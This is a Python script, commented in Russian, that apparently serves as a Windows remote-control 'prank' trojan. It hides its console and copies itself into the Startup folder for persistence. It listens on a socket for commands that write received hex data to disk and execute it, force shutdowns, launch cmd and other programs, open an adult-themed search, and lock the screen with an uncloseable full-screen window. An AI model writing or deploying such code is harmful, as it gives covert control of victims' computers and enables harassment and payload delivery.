import socket
import threading
import ctypes
import time
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser
import shutil
import sys

window_67 = None
window_block = None

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
         print("ошибка автозагрузки!")

def safe_shutdown_windows(delay_seconds=0):
    try:
        # shutdown /s — выключение; /t — задержка в сотнях миллисекунд; /f — принудительное закрытие программ
        cmd = ['shutdown', '/s', '/t', str(delay_seconds * 1), '/f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Выключение запланировано через {delay_seconds} секунд")
        else:
            print(f"Ошибка: {result.stderr}")
    except Exception as e:
        print(f"Исключение: {e}")

def win_error(title, msg):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, msg)
    root.destroy()

MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

def move_cursor(x, y):
    """Перемещение курсора в абсолютные координаты."""
    ctypes.windll.user32.SetCursorPos(x, y)

def download_and_run_app(client_socket, file_data, filename):
    """
    Скачивает файл и запускает его на сервере.
    file_data — байтовые данные файла, filename — имя файла.
    """
    try:
        # Сохраняем файл во временную директорию
        temp_path = os.path.join(os.getcwd(), 'temp')
        os.makedirs(temp_path, exist_ok=True)
        file_path = os.path.join(temp_path, filename)

        with open(file_path, 'wb') as f:
            f.write(file_data)

        # Запускаем файл
        if filename.lower().endswith('.exe'):
            subprocess.Popen([file_path])
            return f"Приложение {filename} запущено"
        elif filename.lower().endswith(('.py', '.pyw')):
            subprocess.Popen(['python', file_path])
            return f"Скрипт {filename} запущен"
        else:
            # Для других типов файлов пытаемся открыть стандартными средствами ОС
            os.startfile(file_path)
            return f"Файл {filename} открыт"
    except Exception as e:
        return f"Ошибка при скачивании/запуске: {str(e)}"

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Получена команда: {data}")
            if data.startswith('download_run:'):
                # Формат: download_run:имя_файла:данные_в_hex
                parts = data.split(':', 2)
                if len(parts) == 3:
                    filename = parts[1]
                    file_data_hex = parts[2]
                    try:
                        file_data = bytes.fromhex(file_data_hex)
                        response = download_and_run_app(client_socket, file_data, filename)
                    except ValueError:
                        response = "Ошибка: неверные данные файла (не hex)"
                else:
                    response = "Ошибка: неверный формат команды"
            else:
                response = execute_command(data)

            client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print(f"Ошибка обработки клиента: {e}")
            break
    client_socket.close()

def execute_command(cmd):
    global window_67, window_block
    if cmd == "курсор":
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
    elif cmd == "выкл пк":
        safe_shutdown_windows(3)
    elif cmd == "сообщение":
        win_error("сообщение", "сообщение от некого приложения)")
    elif cmd == "калькулятор":
        os.system('calc')
    elif cmd == "диспетчер задач":
        os.system('taskmgr')
    elif cmd == "блокнот":
        os.system('notepad')
    elif cmd == "проводник":
        os.system('explorer')
    elif cmd == "cmd":
        os.system('cmd')
    elif cmd == "paint":
        os.system('mspaint')
    elif cmd == "панель управления":
        os.system('control')
    elif cmd == "клавиатура":
        os.system('osk')
    elif cmd == "гугл":
        url = "https://www.google.com"
        webbrowser.open(url)
    elif cmd == "покойо":
        url == "https://www.pocoyo.com"
        webbrowser.open(url)
    elif cmd == "18+":
        url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
        webbrowser.open(url)
    elif cmd == "67":
        if window_67 is None or not window_67.winfo_exists():
            window_67 = tk.Toplevel()
            window_67.title("67")
            window_67.geometry("400x300")
            label = tk.Label(window_67, text="67", foreground="white", background="blue", font=("Arial", 35))
            label.pack(pady=20)
    elif cmd == "блок":
        if window_block is None or not window_block.winfo_exists():
            window_block = tk.Toplevel()
            window_block.title("Блок")
            window_block.geometry("1980x1200")
            window_block.attributes("-fullscreen", True)
            window_block.attributes("-topmost", True)
            window_block.protocol("WM_DELETE_WINDOW", lambda: None)
            label = tk.Label(window_block, text="Вас заметили 👁", foreground="white", background="black", font=("Arial", 50))
            label.pack(expand=True, fill=tk.BOTH)
    else:
        win_error("сообщение", f"{cmd}")

root = tk.Tk()
root.withdraw()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 8888))
server.listen(5)
print("Сервер запущен, ожидает команд...")

def start_server():
 while True:
    client, addr = server.accept()
    print(f"Подключение от {addr}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

root.mainloop()